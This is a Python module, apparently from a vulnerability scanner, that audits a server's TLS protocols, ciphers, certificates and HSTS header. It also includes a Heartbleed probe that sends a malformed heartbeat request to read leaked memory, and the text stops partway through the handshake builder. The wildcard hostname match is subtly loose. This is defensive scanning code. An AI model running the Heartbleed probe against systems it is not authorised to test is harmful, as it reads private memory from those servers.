"""
TLS/SSL security probe for NetSentinel.

This module performs comprehensive TLS/SSL security assessments:
- Certificate validation and chain verification
- Protocol version support (TLS 1.0, 1.1, 1.2, 1.3)
- Cipher suite enumeration and strength analysis
- Certificate transparency checks
- OCSP and CRL validation
- Known vulnerability detection (BEAST, POODLE, Heartbleed, etc.)
"""

import socket
import ssl
import struct
from datetime import datetime, timezone, timedelta
from typing import List, Optional, Tuple, Dict, Any

import httpx
from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import rsa, ec, dsa

from netsentinel.models import Finding, Evidence, CVSSBreakdown
from netsentinel.config import WEAK_CIPHERS, DEPRECATED_TLS, OWASP_MAPPING


# Socket timeout for TLS connections
TLS_TIMEOUT = 5

# Minimum RSA key size considered secure (bits)
MIN_RSA_KEY_SIZE = 2048

# Maximum certificate validity period (days) per CA/Browser Forum
MAX_CERT_VALIDITY_DAYS = 398

# HSTS minimum max-age (1 year in seconds)
MIN_HSTS_MAX_AGE = 31536000

# Heartbleed payload constants
TLS_HEADER_SIZE = 5
HEARTBEAT_REQUEST_TYPE = 1


def probe_tls(host: str, port: int, scan_id: str) -> List[Finding]:
    """
    Run all TLS/SSL probes against the target.
    
    Args:
        host: IP address or domain
        port: Port to probe (usually 443)
        scan_id: UUID for this scan
        
    Returns:
        List of Finding objects
    """
    findings = []
    
    # 1. Protocol version checks
    protocol_findings, supports_legacy_tls = check_protocol_versions(host, port, scan_id)
    findings.extend(protocol_findings)
    
    # 2. Cipher suite enumeration
    findings.extend(enumerate_cipher_suites(host, port, scan_id))
    
    # 3. Certificate inspection
    findings.extend(inspect_certificate(host, port, scan_id))
    
    # 4. HSTS check (only for standard HTTPS port or if we got a TLS connection)
    findings.extend(check_hsts(host, scan_id))
    
    # 5. Heartbleed check (only if TLS 1.0/1.1 supported)
    if supports_legacy_tls:
        findings.extend(check_heartbleed(host, port, scan_id))
    
    return findings


def check_protocol_versions(
    host: str, port: int, scan_id: str
) -> Tuple[List[Finding], bool]:
    """
    Check which TLS/SSL versions are supported.
    
    Returns:
        Tuple of (findings list, supports_legacy_tls flag)
    """
    findings = []
    supports_legacy_tls = False
    supported_versions = []
    
    # TLS versions to test: (name, ssl.TLSVersion constant, severity if deprecated)
    versions_to_test = [
        ('TLSv1.3', ssl.TLSVersion.TLSv1_3, None),
        ('TLSv1.2', ssl.TLSVersion.TLSv1_2, None),
        ('TLSv1.1', ssl.TLSVersion.TLSv1_1, 'medium'),
        ('TLSv1.0', ssl.TLSVersion.TLSv1, 'high'),
    ]
    
    for version_name, version, severity in versions_to_test:
        supported = test_tls_version(host, port, version)
        if supported:
            supported_versions.append(version_name)
            if severity:
                supports_legacy_tls = True
                findings.append(_create_deprecated_protocol_finding(
                    scan_id, version_name, severity
                ))
    
    # Special handling for SSLv3 (requires different approach as it may not be available)
    if test_sslv3(host, port):
        supports_legacy_tls = True
        findings.append(_create_deprecated_protocol_finding(
            scan_id, 'SSLv3', 'critical'
        ))
    
    return findings, supports_legacy_tls


def test_tls_version(host: str, port: int, version: ssl.TLSVersion) -> bool:
    """
    Test if a specific TLS version is supported by making a real handshake.
    
    Args:
        host: Target hostname
        port: Target port
        version: TLS version to test
        
    Returns:
        True if the version is supported
    """
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.minimum_version = version
        context.maximum_version = version
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((host, port), timeout=TLS_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # Handshake succeeded
                return True
    except (ssl.SSLError, socket.error, OSError):
        return False


def test_sslv3(host: str, port: int) -> bool:
    """
    Test if SSLv3 is supported.
    
    SSLv3 is deprecated and vulnerable to POODLE attack.
    Python's ssl module may not support SSLv3 on newer versions,
    so we attempt with legacy options if available.
    """
    try:
        # Try to create a context that only allows SSLv3
        # This will fail on newer Python/OpenSSL if SSLv3 is disabled
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Try to set SSLv3 only - this may raise an error
        try:
            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
            if hasattr(ssl, 'OP_NO_TLSv1_3'):
                context.options |= ssl.OP_NO_TLSv1_3
        except (AttributeError, ssl.SSLError):
            return False
        
        with socket.create_connection((host, port), timeout=TLS_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                negotiated = ssock.version()
                return negotiated == 'SSLv3'
    except (ssl.SSLError, socket.error, OSError, AttributeError):
        return False


def _create_deprecated_protocol_finding(
    scan_id: str, version_name: str, severity: str
) -> Finding:
    """Create a finding for deprecated TLS/SSL protocol support."""
    
    cvss_data = _get_protocol_cvss(severity)
    
    return Finding(
        scan_id=scan_id,
        domain='tls',
        title=f'Deprecated {version_name} supported',
        description=(
            f'{version_name} is deprecated per RFC 8996. This protocol version has known '
            f'security vulnerabilities and should be disabled. Modern clients should use '
            f'TLS 1.2 or TLS 1.3 exclusively.'
        ),
        severity=severity,
        cvss_score=cvss_data['score'],
        cvss_vector=cvss_data['vector'],
        cvss_breakdown=cvss_data['breakdown'],
        owasp_category=OWASP_MAPPING.get('A02', ''),
        owasp_id='A02',
        evidence=Evidence(
            raw_response=f'Server accepted {version_name} handshake'
        ),
        remediation=(
            f'Disable {version_name} in your TLS configuration. Configure your server '
            f'to only accept TLS 1.2 and TLS 1.3 connections.'
        ),
        false_positive_risk='low',
        references=[
            'https://datatracker.ietf.org/doc/rfc8996/',
            'https://cwe.mitre.org/data/definitions/327.html'
        ]
    )


def _get_protocol_cvss(severity: str) -> Dict[str, Any]:
    """Get CVSS data for deprecated protocol findings."""
    if severity == 'critical':
        return {
            'score': 7.5,
            'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
            'breakdown': CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='Low',
                privileges_required='None',
                user_interaction='None',
                scope='Unchanged',
                confidentiality='High',
                integrity='None',
                availability='None'
            )
        }
    elif severity == 'high':
        return {
            'score': 5.9,
            'vector': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
            'breakdown': CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='High',
                privileges_required='None',
                user_interaction='None',
                scope='Unchanged',
                confidentiality='High',
                integrity='None',
                availability='None'
            )
        }
    else:  # medium
        return {
            'score': 4.2,
            'vector': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N',
            'breakdown': CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='High',
                privileges_required='None',
                user_interaction='Required',
                scope='Unchanged',
                confidentiality='Low',
                integrity='Low',
                availability='None'
            )
        }


def enumerate_cipher_suites(host: str, port: int, scan_id: str) -> List[Finding]:
    """
    Enumerate accepted cipher suites and flag weak ones.
    
    Makes real TLS connections to determine which ciphers are accepted.
    """
    findings = []
    accepted_ciphers: List[Tuple[str, str, int]] = []
    
    # Get the negotiated cipher by connecting
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    try:
        with socket.create_connection((host, port), timeout=TLS_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cipher = ssock.cipher()
                if cipher:
                    accepted_ciphers.append(cipher)
    except (ssl.SSLError, socket.error, OSError):
        # Cannot connect, no cipher findings
        return findings
    
    # Check for weak ciphers
    for cipher_name, protocol, bits in accepted_ciphers:
        weak_matches = _check_weak_cipher(cipher_name)
        for weak_component in weak_matches:
            findings.append(_create_weak_cipher_finding(
                scan_id, cipher_name, weak_component, bits
            ))
    
    # Check for missing forward secrecy
    has_pfs = any(
        'ECDHE' in c[0].upper() or 'DHE' in c[0].upper()
        for c in accepted_ciphers
    )
    if not has_pfs and accepted_ciphers:
        findings.append(_create_no_pfs_finding(scan_id, accepted_ciphers))
    
    return findings


def _check_weak_cipher(cipher_name: str) -> List[str]:
    """Check if a cipher suite contains weak components."""
    weak_matches = []
    cipher_upper = cipher_name.upper()
    
    for weak in WEAK_CIPHERS:
        if weak.upper() in cipher_upper:
            weak_matches.append(weak)
    
    return weak_matches


def _create_weak_cipher_finding(
    scan_id: str, cipher_name: str, weak_component: str, bits: int
) -> Finding:
    """Create a finding for weak cipher suite."""
    return Finding(
        scan_id=scan_id,
        domain='tls',
        title=f'Weak cipher suite accepted: {cipher_name}',
        description=(
            f'The server accepts cipher suite {cipher_name} which contains the weak '
            f'component {weak_component}. This cipher may be vulnerable to cryptographic '
            f'attacks and should be disabled.'
        ),
        severity='high',
        cvss_score=5.9,
        cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
        cvss_breakdown=CVSSBreakdown(
            attack_vector='Network',
            attack_complexity='High',
            privileges_required='None',
            user_interaction='None',
            scope='Unchanged',
            confidentiality='High',
            integrity='None',
            availability='None'
        ),
        owasp_category=OWASP_MAPPING.get('A02', ''),
        owasp_id='A02',
        evidence=Evidence(
            raw_response=f'Negotiated cipher: {cipher_name} ({bits} bits)'
        ),
        remediation=(
            f'Disable cipher suites containing {weak_component}. Configure your server '
            f'to only use strong cipher suites with AES-GCM or ChaCha20-Poly1305.'
        ),
        false_positive_risk='low',
        references=[
            'https://cwe.mitre.org/data/definitions/327.html',
            'https://wiki.mozilla.org/Security/Server_Side_TLS'
        ]
    )


def _create_no_pfs_finding(
    scan_id: str, accepted_ciphers: List[Tuple[str, str, int]]
) -> Finding:
    """Create a finding for missing Perfect Forward Secrecy."""
    cipher_list = ', '.join(c[0] for c in accepted_ciphers[:5])
    
    return Finding(
        scan_id=scan_id,
        domain='tls',
        title='No Perfect Forward Secrecy',
        description=(
            'The server does not support cipher suites with Perfect Forward Secrecy '
            '(PFS). Without PFS, if the server\'s private key is compromised, all past '
            'encrypted communications can be decrypted. Cipher suites should use ECDHE '
            'or DHE key exchange.'
        ),
        severity='high',
        cvss_score=5.9,
        cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
        cvss_breakdown=CVSSBreakdown(
            attack_vector='Network',
            attack_complexity='High',
            privileges_required='None',
            user_interaction='None',
            scope='Unchanged',
            confidentiality='High',
            integrity='None',
            availability='None'
        ),
        owasp_category=OWASP_MAPPING.get('A02', ''),
        owasp_id='A02',
        evidence=Evidence(
            raw_response=f'Accepted ciphers without PFS: {cipher_list}'
        ),
        remediation=(
            'Configure your server to prefer cipher suites with ECDHE or DHE key '
            'exchange (e.g., TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384).'
        ),
        false_positive_risk='low',
        references=[
            'https://wiki.mozilla.org/Security/Server_Side_TLS',
            'https://cwe.mitre.org/data/definitions/326.html'
        ]
    )


def inspect_certificate(host: str, port: int, scan_id: str) -> List[Finding]:
    """
    Inspect server certificate for security issues.
    
    Makes a real TLS connection and analyzes the certificate.
    """
    findings = []
    
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((host, port), timeout=TLS_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert_der = ssock.getpeercert(binary_form=True)
                if not cert_der:
                    return findings
                
                # Parse with cryptography library
                cert_obj = x509.load_der_x509_certificate(cert_der)
                
                # Build certificate info for evidence
                cert_info = _extract_cert_info(cert_obj)
                
                # Check expiry
                findings.extend(_check_cert_expiry(scan_id, cert_obj, cert_info))
                
                # Check self-signed
                findings.extend(_check_self_signed(scan_id, cert_obj, cert_info))
                
                # Check hostname match
                findings.extend(_check_hostname_match(scan_id, host, cert_obj, cert_info))
                
                # Check key size
                findings.extend(_check_key_size(scan_id, cert_obj, cert_info))
                
                # Check validity period
                findings.extend(_check_validity_period(scan_id, cert_obj, cert_info))
    
    except (ssl.SSLError, socket.error, OSError, ValueError) as e:
        # Connection or parsing failed
        pass
    
    return findings


def _extract_cert_info(cert: x509.Certificate) -> Dict[str, Any]:
    """Extract certificate information for evidence."""
    try:
        # Get subject CN
        subject_cn = None
        for attr in cert.subject:
            if attr.oid == x509.oid.NameOID.COMMON_NAME:
                subject_cn = attr.value
                break
        
        # Get issuer CN
        issuer_cn = None
        for attr in cert.issuer:
            if attr.oid == x509.oid.NameOID.COMMON_NAME:
                issuer_cn = attr.value
                break
        
        # Get SANs
        sans = []
        try:
            san_ext = cert.extensions.get_extension_for_oid(
                x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )
            for name in san_ext.value:
                if isinstance(name, x509.DNSName):
                    sans.append(name.value)
        except x509.ExtensionNotFound:
            pass
        
        # Get key info
        public_key = cert.public_key()
        key_type = 'Unknown'
        key_size = 0
        if isinstance(public_key, rsa.RSAPublicKey):
            key_type = 'RSA'
            key_size = public_key.key_size
        elif isinstance(public_key, ec.EllipticCurvePublicKey):
            key_type = 'EC'
            key_size = public_key.curve.key_size
        elif isinstance(public_key, dsa.DSAPublicKey):
            key_type = 'DSA'
            key_size = public_key.key_size
        
        return {
            'subject_cn': subject_cn,
            'issuer_cn': issuer_cn,
            'sans': sans,
            'not_before': cert.not_valid_before_utc.isoformat(),
            'not_after': cert.not_valid_after_utc.isoformat(),
            'key_type': key_type,
            'key_size': key_size,
            'serial_number': str(cert.serial_number),
        }
    except Exception:
        return {}


def _check_cert_expiry(
    scan_id: str, cert: x509.Certificate, cert_info: Dict[str, Any]
) -> List[Finding]:
    """Check certificate expiration status."""
    findings = []
    now = datetime.now(timezone.utc)
    
    if cert.not_valid_after_utc < now:
        # Certificate expired
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title='Certificate expired',
            description=(
                f'The server certificate expired on {cert.not_valid_after_utc.isoformat()}. '
                f'Clients will reject connections to this server, and the site will appear '
                f'insecure to users.'
            ),
            severity='critical',
            cvss_score=7.5,
            cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='Low',
                privileges_required='None',
                user_interaction='None',
                scope='Unchanged',
                confidentiality='None',
                integrity='High',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(certificate_info=cert_info),
            remediation='Renew the SSL/TLS certificate immediately.',
            false_positive_risk='low',
            references=['https://cwe.mitre.org/data/definitions/298.html']
        ))
    elif cert.not_valid_after_utc < now + timedelta(days=30):
        # Expires within 30 days
        days_remaining = (cert.not_valid_after_utc - now).days
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title='Certificate expires within 30 days',
            description=(
                f'The server certificate expires in {days_remaining} days on '
                f'{cert.not_valid_after_utc.isoformat()}. Renew the certificate soon '
                f'to avoid service disruption.'
            ),
            severity='high',
            cvss_score=4.3,
            cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='Low',
                privileges_required='None',
                user_interaction='Required',
                scope='Unchanged',
                confidentiality='None',
                integrity='Low',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(certificate_info=cert_info),
            remediation='Renew the SSL/TLS certificate before it expires.',
            false_positive_risk='low',
            references=['https://cwe.mitre.org/data/definitions/298.html']
        ))
    elif cert.not_valid_after_utc < now + timedelta(days=90):
        # Expires within 90 days
        days_remaining = (cert.not_valid_after_utc - now).days
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title='Certificate expires within 90 days',
            description=(
                f'The server certificate expires in {days_remaining} days on '
                f'{cert.not_valid_after_utc.isoformat()}. Plan certificate renewal.'
            ),
            severity='medium',
            cvss_score=3.7,
            cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='High',
                privileges_required='None',
                user_interaction='None',
                scope='Unchanged',
                confidentiality='None',
                integrity='Low',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(certificate_info=cert_info),
            remediation='Schedule SSL/TLS certificate renewal.',
            false_positive_risk='low',
            references=['https://cwe.mitre.org/data/definitions/298.html']
        ))
    
    return findings


def _check_self_signed(
    scan_id: str, cert: x509.Certificate, cert_info: Dict[str, Any]
) -> List[Finding]:
    """Check if certificate is self-signed."""
    findings = []
    
    if cert.issuer == cert.subject:
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title='Self-signed certificate',
            description=(
                'The server is using a self-signed certificate. Self-signed certificates '
                'are not trusted by browsers and can facilitate man-in-the-middle attacks '
                'as users may ignore certificate warnings.'
            ),
            severity='high',
            cvss_score=5.9,
            cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='High',
                privileges_required='None',
                user_interaction='None',
                scope='Unchanged',
                confidentiality='High',
                integrity='None',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(certificate_info=cert_info),
            remediation=(
                'Obtain a certificate from a trusted Certificate Authority (CA). '
                'Consider using Let\'s Encrypt for free automated certificates.'
            ),
            false_positive_risk='low',
            references=['https://cwe.mitre.org/data/definitions/295.html']
        ))
    
    return findings


def _check_hostname_match(
    scan_id: str, host: str, cert: x509.Certificate, cert_info: Dict[str, Any]
) -> List[Finding]:
    """Check if the certificate hostname matches the target."""
    findings = []
    
    # Get all valid hostnames from certificate
    valid_hostnames = set()
    
    # Get CN from subject
    for attr in cert.subject:
        if attr.oid == x509.oid.NameOID.COMMON_NAME:
            valid_hostnames.add(attr.value.lower())
    
    # Get SANs
    try:
        san_ext = cert.extensions.get_extension_for_oid(
            x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME
        )
        for name in san_ext.value:
            if isinstance(name, x509.DNSName):
                valid_hostnames.add(name.value.lower())
    except x509.ExtensionNotFound:
        pass
    
    # Check if host matches any of the valid hostnames
    host_lower = host.lower()
    matches = False
    
    for hostname in valid_hostnames:
        if hostname.startswith('*.'):
            # Wildcard match
            wildcard_domain = hostname[2:]
            if host_lower.endswith(wildcard_domain):
                # Check it's a single subdomain level
                prefix = host_lower[:-len(wildcard_domain)]
                if prefix.count('.') == 0 or (prefix.endswith('.') and prefix.count('.') == 1):
                    matches = True
                    break
        elif hostname == host_lower:
            matches = True
            break
    
    if not matches and valid_hostnames:
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title='Certificate hostname mismatch',
            description=(
                f'The certificate is not valid for hostname "{host}". '
                f'Valid hostnames: {", ".join(sorted(valid_hostnames)[:5])}. '
                f'This will cause certificate errors in browsers.'
            ),
            severity='critical',
            cvss_score=7.5,
            cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='Low',
                privileges_required='None',
                user_interaction='None',
                scope='Unchanged',
                confidentiality='None',
                integrity='High',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(certificate_info=cert_info),
            remediation=(
                f'Obtain a certificate that includes "{host}" in the Subject '
                f'Alternative Name (SAN) extension.'
            ),
            false_positive_risk='low',
            references=['https://cwe.mitre.org/data/definitions/295.html']
        ))
    
    return findings


def _check_key_size(
    scan_id: str, cert: x509.Certificate, cert_info: Dict[str, Any]
) -> List[Finding]:
    """Check if the certificate key size is adequate."""
    findings = []
    
    public_key = cert.public_key()
    
    if isinstance(public_key, rsa.RSAPublicKey):
        key_size = public_key.key_size
        if key_size < MIN_RSA_KEY_SIZE:
            findings.append(Finding(
                scan_id=scan_id,
                domain='tls',
                title=f'Weak RSA key size ({key_size} bits)',
                description=(
                    f'The certificate uses an RSA key of {key_size} bits. RSA keys '
                    f'smaller than {MIN_RSA_KEY_SIZE} bits are considered weak and '
                    f'may be vulnerable to factorization attacks.'
                ),
                severity='high',
                cvss_score=5.9,
                cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N',
                cvss_breakdown=CVSSBreakdown(
                    attack_vector='Network',
                    attack_complexity='High',
                    privileges_required='None',
                    user_interaction='None',
                    scope='Unchanged',
                    confidentiality='High',
                    integrity='None',
                    availability='None'
                ),
                owasp_category=OWASP_MAPPING.get('A02', ''),
                owasp_id='A02',
                evidence=Evidence(certificate_info=cert_info),
                remediation=(
                    f'Generate a new certificate with at least {MIN_RSA_KEY_SIZE}-bit '
                    f'RSA key or use ECDSA with P-256 or higher.'
                ),
                false_positive_risk='low',
                references=[
                    'https://cwe.mitre.org/data/definitions/326.html',
                    'https://wiki.mozilla.org/CA:Problematic_Practices#Short_Keys'
                ]
            ))
    
    return findings


def _check_validity_period(
    scan_id: str, cert: x509.Certificate, cert_info: Dict[str, Any]
) -> List[Finding]:
    """Check if certificate validity period exceeds best practices."""
    findings = []
    
    validity_days = (cert.not_valid_after_utc - cert.not_valid_before_utc).days
    
    if validity_days > MAX_CERT_VALIDITY_DAYS:
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title=f'Certificate validity period exceeds {MAX_CERT_VALIDITY_DAYS} days',
            description=(
                f'The certificate has a validity period of {validity_days} days. '
                f'The CA/Browser Forum requires publicly-trusted certificates to have '
                f'a maximum validity of {MAX_CERT_VALIDITY_DAYS} days. Long validity '
                f'periods increase the window of exposure if the key is compromised.'
            ),
            severity='low',
            cvss_score=2.0,
            cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='High',
                privileges_required='None',
                user_interaction='Required',
                scope='Unchanged',
                confidentiality='Low',
                integrity='None',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(certificate_info=cert_info),
            remediation=(
                f'Renew certificates more frequently. Use automated certificate '
                f'management with shorter validity periods (e.g., 90 days with Let\'s Encrypt).'
            ),
            false_positive_risk='medium',
            references=[
                'https://cabforum.org/baseline-requirements-documents/',
            ]
        ))
    
    return findings


def check_hsts(host: str, scan_id: str) -> List[Finding]:
    """
    Check for Strict-Transport-Security header.
    
    Makes an HTTPS request to check for HSTS header presence and configuration.
    """
    findings = []
    
    try:
        # Use httpx to make HTTPS request
        response = httpx.get(
            f'https://{host}',
            verify=False,  # We're checking security, not enforcing it
            timeout=10,
            follow_redirects=True,
            headers={'User-Agent': 'NetSentinel-Scanner/1.0'}
        )
        
        hsts = response.headers.get('Strict-Transport-Security')
        
        if not hsts:
            findings.append(Finding(
                scan_id=scan_id,
                domain='tls',
                title='HSTS header missing',
                description=(
                    'The Strict-Transport-Security (HSTS) header is not set. HSTS '
                    'instructs browsers to only connect via HTTPS, preventing '
                    'protocol downgrade attacks and cookie hijacking.'
                ),
                severity='medium',
                cvss_score=4.2,
                cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N',
                cvss_breakdown=CVSSBreakdown(
                    attack_vector='Network',
                    attack_complexity='High',
                    privileges_required='None',
                    user_interaction='Required',
                    scope='Unchanged',
                    confidentiality='Low',
                    integrity='Low',
                    availability='None'
                ),
                owasp_category=OWASP_MAPPING.get('A02', ''),
                owasp_id='A02',
                evidence=Evidence(
                    raw_response=f'Response headers: {dict(response.headers)}'
                ),
                remediation=(
                    'Add the Strict-Transport-Security header with appropriate max-age. '
                    'Example: Strict-Transport-Security: max-age=31536000; includeSubDomains'
                ),
                false_positive_risk='low',
                references=[
                    'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security',
                    'https://cwe.mitre.org/data/definitions/523.html'
                ]
            ))
        else:
            # Parse and check HSTS configuration
            findings.extend(_check_hsts_config(scan_id, hsts))
    
    except (httpx.RequestError, httpx.TimeoutException):
        # Cannot make HTTPS request, skip HSTS check
        pass
    
    return findings


def _check_hsts_config(scan_id: str, hsts_header: str) -> List[Finding]:
    """Check HSTS header configuration for weaknesses."""
    findings = []
    
    # Check max-age
    if 'max-age' in hsts_header.lower():
        try:
            # Parse max-age value
            parts = hsts_header.lower().split('max-age=')
            if len(parts) > 1:
                max_age_str = parts[1].split(';')[0].strip()
                max_age = int(max_age_str)
                
                if max_age < MIN_HSTS_MAX_AGE:
                    findings.append(Finding(
                        scan_id=scan_id,
                        domain='tls',
                        title='HSTS max-age too short',
                        description=(
                            f'The HSTS max-age is set to {max_age} seconds '
                            f'({max_age // 86400} days). For effective protection, '
                            f'max-age should be at least {MIN_HSTS_MAX_AGE} seconds (1 year).'
                        ),
                        severity='low',
                        cvss_score=2.0,
                        cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N',
                        cvss_breakdown=CVSSBreakdown(
                            attack_vector='Network',
                            attack_complexity='High',
                            privileges_required='None',
                            user_interaction='Required',
                            scope='Unchanged',
                            confidentiality='Low',
                            integrity='None',
                            availability='None'
                        ),
                        owasp_category=OWASP_MAPPING.get('A02', ''),
                        owasp_id='A02',
                        evidence=Evidence(
                            raw_response=f'HSTS header: {hsts_header}'
                        ),
                        remediation=(
                            f'Increase HSTS max-age to at least {MIN_HSTS_MAX_AGE} seconds. '
                            f'Example: max-age=31536000'
                        ),
                        false_positive_risk='low',
                        references=[
                            'https://hstspreload.org/',
                        ]
                    ))
        except (ValueError, IndexError):
            pass
    
    # Check includeSubDomains
    if 'includesubdomains' not in hsts_header.lower():
        findings.append(Finding(
            scan_id=scan_id,
            domain='tls',
            title='HSTS missing includeSubDomains',
            description=(
                'The HSTS header does not include the includeSubDomains directive. '
                'Without this, subdomains are not protected and may be vulnerable '
                'to man-in-the-middle attacks.'
            ),
            severity='low',
            cvss_score=2.0,
            cvss_vector='CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N',
            cvss_breakdown=CVSSBreakdown(
                attack_vector='Network',
                attack_complexity='High',
                privileges_required='None',
                user_interaction='Required',
                scope='Unchanged',
                confidentiality='Low',
                integrity='None',
                availability='None'
            ),
            owasp_category=OWASP_MAPPING.get('A02', ''),
            owasp_id='A02',
            evidence=Evidence(
                raw_response=f'HSTS header: {hsts_header}'
            ),
            remediation=(
                'Add includeSubDomains to the HSTS header. '
                'Example: max-age=31536000; includeSubDomains'
            ),
            false_positive_risk='medium',
            references=[
                'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security',
            ]
        ))
    
    return findings


def check_heartbleed(host: str, port: int, scan_id: str) -> List[Finding]:
    """
    Check for Heartbleed vulnerability (CVE-2014-0160).
    
    Sends a malformed TLS heartbeat request and checks for memory leak.
    Only runs if TLS 1.0/1.1 is supported.
    """
    findings = []
    
    # Build TLS ClientHello with heartbeat extension
    client_hello = _build_heartbleed_client_hello()
    
    try:
        sock = socket.create_connection((host, port), timeout=TLS_TIMEOUT)
        sock.settimeout(TLS_TIMEOUT)
        
        # Send ClientHello
        sock.sendall(client_hello)
        
        # Receive ServerHello and other handshake messages
        response = _receive_tls_messages(sock)
        
        if not response:
            sock.close()
            return findings
        
        # Send malformed heartbeat request
        heartbeat = _build_heartbleed_request()
        sock.sendall(heartbeat)
        
        # Check for heartbeat response
        heartbeat_response = _receive_heartbeat_response(sock)
        
        sock.close()
        
        if heartbeat_response and len(heartbeat_response) > 3:
            # Vulnerable - received more data than expected
            findings.append(Finding(
                scan_id=scan_id,
                domain='tls',
                title='Heartbleed vulnerability (CVE-2014-0160)',
                description=(
                    'The server is vulnerable to the Heartbleed vulnerability '
                    '(CVE-2014-0160). This critical flaw in OpenSSL allows attackers '
                    'to read sensitive memory contents, including private keys, '
                    'user credentials, and session tokens.'
                ),
                severity='critical',
                cvss_score=9.8,
                cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
                cvss_breakdown=CVSSBreakdown(
                    attack_vector='Network',
                    attack_complexity='Low',
                    privileges_required='None',
                    user_interaction='None',
                    scope='Unchanged',
                    confidentiality='High',
                    integrity='High',
                    availability='High'
                ),
                owasp_category=OWASP_MAPPING.get('A06', ''),
                owasp_id='A06',
                evidence=Evidence(
                    raw_response=f'Received {len(heartbeat_response)} bytes in heartbeat response (memory leak detected)'
                ),
                remediation=(
                    'Upgrade OpenSSL to a patched version immediately. Regenerate all '
                    'SSL certificates and revoke the old ones. Reset all user passwords '
                    'and session tokens.'
                ),
                false_positive_risk='low',
                references=[
                    'https://heartbleed.com/',
                    'https://nvd.nist.gov/vuln/detail/CVE-2014-0160',
                    'https://cwe.mitre.org/data/definitions/126.html'
                ]
            ))
    
    except (socket.error, OSError):
        # Connection failed, server may not be vulnerable or not accepting connections
        pass
    
    return findings


def _build_heartbleed_client_hello() -> bytes:
    """Build a TLS ClientHello with heartbeat extension."""
    # TLS 1.0 ClientHello with heartbeat extension
    # Record type: Handshake (0x16)
    # Version: TLS 1.0 (0x0301)
    
    # Heartbeat extension: type=0x000f, length=1, mode=1 (peer_allowed_to_send)
    heartbeat_ext = bytes([0x00, 0x0f, 0x00, 0x01, 0x01])
    
    # Cipher suites (common ones)
    cipher_suites = bytes([
